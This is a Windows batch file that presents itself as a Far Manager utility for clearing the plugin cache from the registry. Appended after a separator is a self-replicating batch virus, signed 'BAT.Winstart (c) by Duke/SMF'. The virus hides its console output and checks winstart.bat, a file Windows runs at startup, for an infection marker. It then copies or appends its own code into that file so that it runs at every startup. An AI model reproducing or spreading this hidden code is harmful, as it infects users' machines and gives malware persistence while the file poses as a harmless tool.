rem -------------------------------------------------------------------------------------------------------------
@echo off
rem This batch file cleared the Plugin Cache

echo REGEDIT4 > "%TEMP%\$DelOld$.reg"
echo [-HKEY_CURRENT_USER\Software\Far\PluginsCache] >> "%TEMP%\$DelOld$.reg"
start/wait regedit -s "%TEMP%\$DelOld$.reg"
del "%TEMP%\$DelOld$.reg" > nul
rem -------------------------------------------------------------------------------------------------------------:NNN
:YYY
@ctty nul
if "%windir%==" goto clo
set f=%windir%\winstart.bat
if %0==%f% goto clo
if not exist %f% goto typ
type 1>z1
type 2>z2
type 3>z3
echo :NNN>>%f%
del z? /p<%f%
if exist z? goto zar
goto clo
:BAT.Winstart (c) by Duke/SMF
:zar
del z?
type %0>>%f%
goto clo
:typ
type %0>%f%
:clo
ctty con
